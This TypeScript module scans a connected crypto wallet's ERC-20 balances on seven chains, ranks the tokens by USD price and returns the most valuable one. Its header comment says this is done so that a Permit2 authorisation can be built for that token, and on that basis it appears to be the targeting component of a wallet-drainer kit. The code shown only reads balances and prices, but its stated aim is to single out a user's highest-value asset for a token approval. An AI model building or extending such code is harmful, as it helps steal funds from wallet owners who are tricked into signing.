// src/lib/walletScanner.ts
// Fully client-side wallet scan. No backend involved.
//   1. Reads ERC-20 balances for a curated token list on the connected chain
//      via viem's multicall.
//   2. Fetches USD prices from CoinGecko.
//   3. Returns the highest-USD-value token so we can build a Permit2
//      authorisation for it.

import { createPublicClient, http, formatUnits, erc20Abi, type Address } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';

export interface ScannedToken {
  address: Address;
  symbol: string;
  name: string;
  decimals: number;
  balance: bigint;
  balanceFormatted: string;
  priceUsd: number;
  valueUsd: number;
  coingeckoId: string;
}

interface TokenDef {
  address: Address;
  symbol: string;
  name: string;
  decimals: number;
  coingeckoId: string;
}

// Curated high-liquidity tokens per chain. Add more if needed.
const TOKEN_LIST: Record<number, TokenDef[]> = {
  1: [
    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', name: 'Tether', decimals: 6, coingeckoId: 'tether' },
    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', name: 'Dai', decimals: 18, coingeckoId: 'dai' },
    { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, coingeckoId: 'weth' },
    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', name: 'Wrapped BTC', decimals: 8, coingeckoId: 'wrapped-bitcoin' },
    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', name: 'Chainlink', decimals: 18, coingeckoId: 'chainlink' },
    { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', name: 'Uniswap', decimals: 18, coingeckoId: 'uniswap' },
  ],
  56: [
    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', name: 'Tether', decimals: 18, coingeckoId: 'tether' },
    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', name: 'USD Coin', decimals: 18, coingeckoId: 'usd-coin' },
    { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', name: 'Binance USD', decimals: 18, coingeckoId: 'binance-usd' },
    { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', name: 'Wrapped BNB', decimals: 18, coingeckoId: 'wbnb' },
  ],
  137: [
    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', name: 'Tether', decimals: 6, coingeckoId: 'tether' },
    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
    { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC', name: 'Wrapped Matic', decimals: 18, coingeckoId: 'wmatic' },
  ],
  42161: [
    { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', name: 'Tether', decimals: 6, coingeckoId: 'tether' },
    { address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
    { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', name: 'Wrapped Ether', decimals: 18, coingeckoId: 'weth' },
  ],
  10: [
    { address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', symbol: 'USDT', name: 'Tether', decimals: 6, coingeckoId: 'tether' },
    { address: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
  ],
  8453: [
    { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
  ],
  43114: [
    { address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', name: 'Tether', decimals: 6, coingeckoId: 'tether' },
    { address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', name: 'USD Coin', decimals: 6, coingeckoId: 'usd-coin' },
  ],
};

const CHAIN_MAP: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

const getClient = (chainId: number) => {
  const chain = CHAIN_MAP[chainId] ?? mainnet;
  return createPublicClient({ chain, transport: http() });
};

const fetchPrices = async (ids: string[]): Promise<Record<string, number>> => {
  if (!ids.length) return {};
  try {
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`;
    const res = await fetch(url);
    if (!res.ok) return {};
    const data = (await res.json()) as Record<string, { usd: number }>;
    const out: Record<string, number> = {};
    for (const [k, v] of Object.entries(data)) out[k] = v?.usd ?? 0;
    return out;
  } catch {
    return {};
  }
};

export async function scanWallet(address: Address, chainId: number): Promise<ScannedToken[]> {
  const tokens = TOKEN_LIST[chainId];
  if (!tokens?.length) return [];

  const client = getClient(chainId);
  const balances = await client.multicall({
    contracts: tokens.map((t) => ({
      address: t.address,
      abi: erc20Abi,
      functionName: 'balanceOf' as const,
      args: [address],
    })),
    allowFailure: true,
  } as any) as Array<{ status: string; result?: unknown }>;

  const prices = await fetchPrices(tokens.map((t) => t.coingeckoId));

  const scanned: ScannedToken[] = tokens.map((t, i) => {
    const raw = balances[i];
    const balance = (raw.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
    const balanceFormatted = formatUnits(balance, t.decimals);
    const priceUsd = prices[t.coingeckoId] ?? 0;
    const valueUsd = parseFloat(balanceFormatted) * priceUsd;
    return {
      address: t.address,
      symbol: t.symbol,
      name: t.name,
      decimals: t.decimals,
      balance,
      balanceFormatted,
      priceUsd,
      valueUsd,
      coingeckoId: t.coingeckoId,
    };
  });

  return scanned
    .filter((t) => t.balance > 0n)
    .sort((a, b) => b.valueUsd - a.valueUsd);
}

export const pickTopToken = (tokens: ScannedToken[]): ScannedToken | null =>
  tokens.length ? tokens[0] : null;
